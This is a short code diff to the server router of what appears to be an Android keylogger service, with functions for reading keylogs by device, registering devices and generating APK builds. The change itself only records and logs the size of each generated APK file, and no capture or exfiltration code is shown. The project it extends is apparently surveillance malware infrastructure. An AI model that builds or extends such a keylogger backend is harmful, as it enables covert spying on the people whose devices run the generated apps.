@@ -8,7 +8,7 @@ import { getSessionCookieOptions } from "./_core/cookies";
 import { COOKIE_NAME } from "../shared/const";
 import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
-import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser, createAPKBuild, getAPKBuildsByUser, updateAPKBuildStatus } from "./db";
+import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser, createAPKBuild, getAPKBuildsByUser, updateAPKBuildStatus, updateAPKBuildFileSize } from './db';
 import { sdk } from "./_core/sdk";
 import { generateRealAPK } from "./apk-generator";
 
@@ -259,10 +259,15 @@ export const appRouter = router({
               if (!fs.existsSync(apksDir)) {
                 fs.mkdirSync(apksDir, { recursive: true });
               }
-              fs.writeFileSync(path.join(apksDir, filename), apkBuffer);
-
+              const apkPath = path.join(apksDir, filename);
+              fs.writeFileSync(apkPath, apkBuffer);
+              
+              // Atualizar fileSize
+              const fileSize = fs.statSync(apkPath).size;
+              await updateAPKBuildFileSize(build.id, fileSize);
+              
               await updateAPKBuildStatus(build.id, 'success');
-              console.log(`[APK] Build concluído: ${filename}`);
+              console.log(`[APK] Build concluído: ${filename} (${(fileSize / 1024 / 1024).toFixed(2)}MB)`);
             } catch (error) {
               console.error('[APK] Erro ao gerar APK:', error);
               await updateAPKBuildStatus(build.id, 'failed', String(error));
